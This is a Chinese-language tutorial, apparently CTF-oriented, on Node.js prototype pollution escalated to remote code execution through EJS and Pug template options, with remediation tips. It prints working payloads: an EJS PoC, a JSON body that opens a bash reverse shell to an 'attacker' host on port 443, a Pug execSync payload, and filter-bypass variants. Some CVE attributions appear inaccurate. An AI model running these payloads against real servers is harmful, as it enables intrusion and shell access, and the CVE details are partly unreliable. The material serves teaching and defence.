# Web-Node.js 原型链污染 + 模板注入实战

## 1. 原型链污染原理

JavaScript 中每个对象都有一个隐藏的 `__proto__` 属性指向其构造函数的 `prototype` 对象。当应用允许用户控制属性名并通过递归合并或动态赋值污染 `Object.prototype` 时，即发生**原型链污染（Prototype Pollution）**。

```javascript
// 示例：一个不安全的 merge 函数
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);   // 递归：若 key 为 "__proto__" 则污染原型
        } else {
            target[key] = source[key];
        }
    }
}

// 攻击者提交 JSON
const userInput = JSON.parse('{"__proto__":{"polluted":"yes"}}');
merge({}, userInput);
console.log({}.polluted);  // "yes" → 所有对象继承了污染属性
```

## 2. 常见触发点

| 场景 | 典型漏洞函数 | 历史 CVE |
|------|-------------|----------|
| 深合并 | `merge` / `deepMerge` / `assignDeep` | lodash `defaultsDeep`（CVE-2019-10744） |
| 深赋值 | `_.set` / `set-value` / `flat` | lodash `set`（CVE-2019-10744） |
| JSON 解析 | `JSON.parse` 后直接赋值给对象属性 | body-parser（旧版） |
| YAML 解析 | `js-yaml` unsafeLoad | CVE-2021-3189 |
| 模板引擎 | `EJS` / `Pug(Jade)` / `Handlebars` / `dustjs` | 通过污染模板编译参数 |
| CLI 参数解析 | `minimist`、`yargs-parser` | CVE-2020-7598（minimist） |

### 2.1 lodash.defaultsDeep 示例

```javascript
const _ = require('lodash');
// CVE-2019-10744
_.defaultsDeep({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log({}.polluted);  // "yes"
```

### 2.2 构造两种路径

```
路径 1：  {"__proto__":{"evil":"yes"}}          →  直接污染
路径 2：  {"constructor":{"prototype":{"evil":"yes"}}}   →  通过构造函数间接污染（绕过过滤）
```

## 3. 影响

### 3.1 原型链污染的三种危害

| 级别 | 表现 |
|------|------|
| 低 | 业务逻辑绕过：比如 `if (user.isAdmin) {...}` 被污染为 true |
| 中 | 模板注入：污染模板引擎的编译参数，导致代码注入 |
| 高 | RCE：污染某些函数的 `eval` / `new Function` / `child_process` 参数 |

### 3.2 典型业务逻辑绕过

```javascript
// 业务代码
const user = { name: "guest" };
if (user.isAdmin) {
    // 执行管理员操作
}

// 攻击者提交 body（被 body-parser 解析为对象后）：
// {"__proto__":{"isAdmin":true}}
// 所有对象继承 isAdmin=true，绕过权限
```

## 4. EJS 原型链污染 → RCE

### 4.1 EJS 原理

EJS 渲染模板时，会读取 `opts.outputFunctionName` 作为输出函数名。如果这个属性被原型链污染，就会把恶意字符串拼接到函数名，实现 RCE：

```javascript
// EJS 内部近似实现
function Template(str, opts) {
    // opts 从 Object.prototype 继承污染的属性
    const fn = new Function(
        opts.localsName || 'locals',
        opts.outputFunctionName || 'escapeFn',  // 被污染为恶意字符串
        compiledBody
    );
}
```

### 4.2 完整 PoC

```javascript
const ejs = require('ejs');

// Step 1：原型链污染 outputFunctionName
Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').execSync('id > /tmp/pwned').toString();s=function s(){}";

// Step 2：调用 EJS 渲染
ejs.render("hello <%= name %>", { name: "test" });
// 检查 /tmp/pwned 是否存在
```

### 4.3 通过 JSON body 实际触发

```
POST /render
Content-Type: application/json

{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/attacker/443 0>&1\"').toString();s=function s(){}"
  }
}
```

## 5. Pug(Jade) 原型链污染 → RCE

### 5.1 Pug 利用思路

Pug 编译模板时会读取 `opts.self`、`opts.debug` 等属性。通过原型链污染可以影响编译行为：

```javascript
const pug = require('pug');
Object.prototype.self = true;
Object.prototype.block = "process.mainModule.require('child_process').execSync('id')";
pug.render("h1 hello");
```

### 5.2 通过 options 污染执行代码

某些版本 Pug 会把 `opts` 合并到编译时作用域，原型链污染可以让攻击者注入 `with (options) { ... }` 中执行代码。

## 6. Handlebars / dustjs-linkedin 原型链污染

原理类似，攻击者通过污染 `helpers`、`partials` 等配置项的 `__proto__`，再触发 helper 执行时调用 `require('child_process').execSync`。

## 7. 绕过过滤

| 过滤 | 绕过方式 |
|------|---------|
| 过滤 `__proto__` 字符串 | 使用 `constructor.prototype` 间接污染 |
| 过滤 constructor | 使用 `Object.getPrototypeOf({})` 或 `{}.__proto__.constructor` |
| 过滤 JSON 关键字 | 使用不同编码（URL 编码 / hex / HTML 实体） |
| 合并前 hasOwnProperty 检查 | 使用特殊原型链路径如 `{ "constructor": { "prototype": { ... } } }` |

Bypass payload 示例：

```javascript
// 绕过 __proto__ 过滤（使用 constructor.prototype
JSON.parse('{"constructor":{"prototype":{"polluted":"yes"}}}')

// 绕过字符串匹配（URL 编码
%7B%22__proto__%22%3A%7B%22evil%22%3A%22yes%22%7D%7D
```

## 8. 实战检测方法

```javascript
// 测试原型链污染是否生效
// payload 1
{
  "__proto__": {
    "is_admin": 1
  }
}

// payload 2（Bypass
{
  "constructor": {
    "prototype": {
      "is_admin": 1
    }
  }
}

// 响应后判断 {}.is_admin 是否为 1
// 可在 response body / debug 页面 / API 中检查污染是否生效
```

## 9. 修复建议

### 9.1 代码层面

```javascript
// 1. 使用 Object.create(null) 创建"干净"的对象
const safe = Object.create(null);
// 2. 合并前检查 hasOwnProperty
function safeMerge(target, source) {
    for (let key in source) {
        if (Object.prototype.hasOwnProperty.call(source, key) && key !== '__proto__' && key !== 'constructor' && key !== 'prototype') {
            // 正常合并
        }
    }
}

// 3. 使用 Map 替代 {}
const userData = new Map();

// 4. 冻结 Object.prototype（防御性编程，防止下游代码污染）
Object.freeze(Object.prototype);
```

### 9.2 依赖层面

| 操作 | 说明 |
|------|------|
| 升级 lodash ≥ 4.17.12+ | CVE-2019-10744 已修复 |
| 升级 minimist ≥ 1.2.6 | CVE-2020-7598（minimist） |
| 升级 EJS ≥ 3.1.7 | 新版已加强对 opts 的校验 |
| 使用 `npm audit` / `snyk` 定期扫描 | 识别依赖漏洞 |

## 10. 实战流程

```
Step 1  识别 JSON/YAML body 解析点（body-parser、express.json()）
Step 2  尝试原型链污染：提交 {"__proto__":{"xxx":"yyy"}}
Step 3  通过响应 / debug 页面判断是否成功污染
Step 4  判断使用的模板引擎（EJS/Pug/Handlebars/dust）
Step 5  对应构造 RCE payload（outputFunctionName、block 等）
Step 6  部署 nc 监听，获得 shell / flag
Step 7  整理 Writeup（截图 + payload + 原理说明）
```

> 原型链污染本质是"**让攻击者控制全局属性**"。配合 `EJS` / `Pug` 等模板引擎编译参数可实现 RCE。掌握关键是理解 JavaScript 原型链 + 识别业务中的递归赋值逻辑。
